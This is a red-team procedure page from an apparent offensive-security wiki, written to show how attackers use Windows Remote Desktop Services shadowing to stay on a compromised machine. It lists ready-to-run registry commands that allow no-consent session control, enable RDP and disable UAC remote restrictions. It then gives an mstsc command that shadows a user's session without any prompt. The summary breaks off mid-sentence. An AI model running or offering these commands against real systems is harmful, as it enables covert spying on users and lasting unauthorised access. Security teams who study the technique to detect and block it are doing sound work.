---
id: a57b49f5-89ca-44e5-a46b-a19c5a3256fe
name: Windows - Remote Desktop Services Shadowing Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.240770+00:00'
updated_at: '2023-04-10T20:37:27.872717+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]'
tags:
- '[[Elevated]]'
- '[[Remote Desktop Services Shadowing]]'
- '[[Windows - Persistence]]'
commands:
- '[[Allow Remote Connections]]'
- '[[Configure Terminal Services Shadowing]]'
- '[[Disable UAC Remote Restriction]]'
- '[[Shadow a Remote Session]]'
---

# Windows - Remote Desktop Services Shadowing Persistence

## Summary

Remote Desktop Services Shadowing allows an administrator to view the desktop session of another user without interrupting that user's session. An attacker may use this technique to maintain persistence and evade detection. To use this technique, an attacker must have administrator-level access to 

## Description

# Description

Remote Desktop Services Shadowing allows an administrator to view the desktop session of another user without interrupting that user's session. An attacker may use this technique to maintain persistence and evade detection. To use this technique, an attacker must have administrator-level access to the system. Once the attacker has access, they can shadow a user's session and remain undetected. This technique is commonly used by attackers to maintain access to a compromised system, even after the initial compromise has been detected and remediated.

Technical Explanation: Remote Desktop Services Shadowing is a feature in Windows that allows an administrator to view the desktop session of another user without interrupting that user's session. This technique can be used by an attacker to remain undetected on a compromised system. To use this technique, an attacker must have administrator-level access to the system. Once the attacker has access, they can use the Remote Desktop Shadowing command to view the desktop session of another user without interrupting that user's session.

Business Value: Attackers can use this technique to maintain access to a compromised system, even after the initial compromise has been detected and remediated. This can result in the theft of sensitive data, financial loss, and damage to the organization's reputation.

 

## Requirements

1. Administrator-level access to the compromised system

1. Access to the Remote Desktop Shadowing command

 

## Defense

1. Limit administrator-level access to only those who require it

1. Monitor for unusual Remote Desktop activity

1. Disable Remote Desktop Services Shadowing if not required

 

## Objectives

1. Maintain persistence on the compromised system

1. Remain undetected on the compromised system

 

# Instructions

1. To shadow a user's session remotely, run the following commands:

 



**Code**: [[reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Micr]]



> - The first command adds a registry key that enables the shadowing feature with permission to view the session without user's permission.
- The second command allows remote connections to the computer.
- The third command disables UAC remote restriction.
- Finally, run the 'mstsc' command to shadow the remote session. Replace the {ADDRESS} and {SESSION_ID} parameters with the IP address or hostname of the remote host and the shadowee's session ID respectively. Use the /noconsentprompt parameter to bypass the shadowee's permission and /prompt parameter to specify the user's credentials to connect to the remote host.



**Command** ([[Configure Terminal Services Shadowing]]):

```bash
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
```





**Command** ([[Allow Remote Connections]]):

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```





**Command** ([[Disable UAC Remote Restriction]]):

```bash
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```





**Command** ([[Shadow a Remote Session]]):

```bash
mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]

## Commands Used

- [[Allow Remote Connections]]
- [[Configure Terminal Services Shadowing]]
- [[Disable UAC Remote Restriction]]
- [[Shadow a Remote Session]]

## Tags

- [[Elevated]]
- [[Remote Desktop Services Shadowing]]
- [[Windows - Persistence]]


